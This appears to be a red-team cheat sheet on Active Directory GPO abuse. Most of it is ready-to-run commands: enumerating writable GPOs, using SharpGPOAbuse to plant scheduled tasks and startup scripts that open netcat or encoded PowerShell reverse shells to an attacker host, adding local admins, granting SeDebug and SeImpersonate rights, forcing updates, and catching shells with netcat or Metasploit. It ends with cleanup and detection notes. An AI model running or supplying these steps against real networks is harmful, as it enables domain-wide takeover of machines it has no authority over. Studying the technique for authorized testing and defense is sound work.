# GPO Abuse

Group Policy Objects (GPOs) define configurations and enforce settings across all machines and users in their scope. When a GPO updates — either on schedule (every 90 minutes by default) or forced manually — every policy it contains executes on every machine in scope.

The attack angle: if your current account has write permissions over a GPO, you can inject malicious tasks, scripts, or local admin additions into that GPO. The next time policy refreshes, your payload runs on every machine the GPO applies to — including those used by Domain Admins.

---

## Required Permissions

Any of the following on a GPO object is enough:

| Permission | Description |
|---|---|
| `GenericAll` | Full control over the GPO |
| `GenericWrite` | Edit GPO attributes |
| `WriteProperty` | Modify specific properties |
| `WriteDACL` | Modify the ACL of the GPO |
| `WriteOwner` | Take ownership of the GPO |

---

## Step 1 — Enumerate GPO Permissions

### PowerView

```powershell
# Import PowerView
powershell -ExecutionPolicy Bypass
Import-Module .\PowerView.ps1

# List all GPOs
Get-NetGPO | Select-Object displayname, name

# Find GPOs where your user or group has write permissions
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' |
  Where-Object {
    ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and
    ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')
  } | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier | Format-List

# Convert SID to name to see which accounts have those rights
"<SID>" | Convert-SidToName

# Find which OUs and machines a specific GPO applies to
Get-NetGPO -GPOName "<gpo_display_name>" | Get-NetOU
Get-NetOU -GUID "<gpo_guid>" | Get-NetComputer
```

### BloodHound

Look for these edges from your compromised account:

- `WriteGPO`
- `GenericWrite` on a GPO object
- `GenericAll` on a GPO object
- `GPOAppliesTo` — shows which OUs the GPO applies to

```cypher
MATCH p=(u)-[:GenericWrite|GenericAll|WriteGPO]->(g:GPO) RETURN p
```

### Native PowerShell

```powershell
# Check permissions on a specific GPO by GUID
Get-GPPermission -Guid <gpo_guid> -TargetType User -TargetName <username>

# List all GPOs and their linked OUs
Get-GPO -All | ForEach-Object {
    $gpo = $_
    Get-GPOReport -Guid $gpo.Id -ReportType XML |
        Select-String "LinksTo" | ForEach-Object { "$($gpo.DisplayName): $_" }
}
```

---

## Step 2 — Identify the Target GPO

```powershell
# Get GPO details by display name
Get-GPO -Name "<display_name>"

# Get GPO details by GUID
Get-GPO -Guid <gpo_guid>

# Find GPOs linked to high-value OUs (Domain Controllers, Admins)
Get-NetGPO | Where-Object { $_.displayname -match "Default|Admin|DC|Controller" }
```

---

## Step 3 — Exploit with SharpGPOAbuse

Download: https://github.com/FSecureLABS/SharpGPOAbuse

### Option A — Add a Scheduled Task (Reverse Shell)

Injects a scheduled task into the GPO that runs a command on all machines in scope.

```powershell
# Reverse shell via netcat
.\SharpGPOAbuse.exe --AddComputerTask \
  --TaskName "WindowsUpdate" \
  --Author "<domain>\<current_user>" \
  --Command "cmd.exe" \
  --Arguments "/c C:\Windows\Temp\nc.exe <attacker_ip> <port> -e cmd.exe" \
  --GPOName "<target_gpo_name>"

# PowerShell reverse shell
.\SharpGPOAbuse.exe --AddComputerTask \
  --TaskName "SysUpdate" \
  --Author "<domain>\<current_user>" \
  --Command "powershell.exe" \
  --Arguments "-enc <base64_encoded_payload>" \
  --GPOName "<target_gpo_name>"

# Run as SYSTEM
.\SharpGPOAbuse.exe --AddComputerTask \
  --TaskName "SysUpdate" \
  --Author "SYSTEM" \
  --Command "cmd.exe" \
  --Arguments "/c <command>" \
  --GPOName "<target_gpo_name>" \
  --RunAs SYSTEM
```

### Option B — Add a Local Administrator

Adds a domain user to the local Administrators group on all machines in scope — no shell needed.

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin \
  --UserAccount <domain>\<username> \
  --GPOName "<target_gpo_name>"
```

### Option C — Add a User Right

Grants specific privileges to a user across all machines in scope.

```powershell
# Grant SeDebugPrivilege
.\SharpGPOAbuse.exe --AddUserRights \
  --UserRights "SeDebugPrivilege" \
  --UserAccount <domain>\<username> \
  --GPOName "<target_gpo_name>"

# Grant SeImpersonatePrivilege (useful for potato attacks)
.\SharpGPOAbuse.exe --AddUserRights \
  --UserRights "SeImpersonatePrivilege" \
  --UserAccount <domain>\<username> \
  --GPOName "<target_gpo_name>"
```

### Option D — Add a Startup Script

Runs a script at machine startup for all machines in GPO scope.

```powershell
.\SharpGPOAbuse.exe --AddComputerScript \
  --ScriptName "update.bat" \
  --ScriptContents "cmd.exe /c C:\Windows\Temp\nc.exe <attacker_ip> <port> -e cmd.exe" \
  --GPOName "<target_gpo_name>"
```

---

## Step 4 — Trigger the Policy Update

GPO changes apply automatically on the next refresh cycle (~90 minutes). Force immediate update:

```cmd
# Force update on the local machine
gpupdate /force

# Force update on a remote machine (requires admin)
Invoke-GPUpdate -Computer <target_hostname> -Force

# Force update domain-wide via PsExec
PsExec.exe \\<target_host> gpupdate /force
```

---

## Step 5 — Catch the Shell

Set up your listener before triggering the update:

```bash
# Netcat listener
nc -nvlp <port>

# rlwrap for a better shell
rlwrap nc -nvlp <port>

# Metasploit handler
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
run
```

---

## Full Attack Example

```powershell
# 1. Find a writable GPO
Import-Module .\PowerView.ps1
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' |
  Where-Object { $_.ActiveDirectoryRights -match 'GenericWrite' } |
  Select-Object ObjectDN, SecurityIdentifier

# 2. Convert the SID to confirm it's your account
"S-1-5-21-1234-5678-9012-1105" | Convert-SidToName

# 3. Identify the GPO name from ObjectDN
# ObjectDN: CN={GUID},CN=Policies,CN=System,DC=domain,DC=com
Get-GPO -Guid <GUID>

# 4. Add yourself as local admin via SharpGPOAbuse
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount domain\youruser --GPOName "Default Domain Policy"

# 5. Force policy update
gpupdate /force

# 6. Verify local admin on target
crackmapexec smb <target> -u <username> -p <password>
```

---

## Cleanup

Remove injected tasks or settings after the engagement:

```powershell
# List scheduled tasks added via GPO
Get-ScheduledTask | Where-Object { $_.TaskName -eq "WindowsUpdate" }

# Remove a scheduled task
Unregister-ScheduledTask -TaskName "WindowsUpdate" -Confirm:$false

# Revert local admin addition — remove user from local admins
net localgroup Administrators <domain>\<username> /delete
```

---

## Detection Notes

- Event ID 5136 — directory service object modification (GPO attribute changed)
- Event ID 4739 — domain policy changed
- Event ID 4706 / 4707 — new trust or trust modification
- Scheduled task creation under `C:\Windows\System32\GroupPolicy\` is suspicious
- Monitor `SYSVOL\<domain>\Policies\` for unexpected XML modifications
- BloodHound: audit `WriteGPO` and `GenericWrite` edges on GPO nodes regularly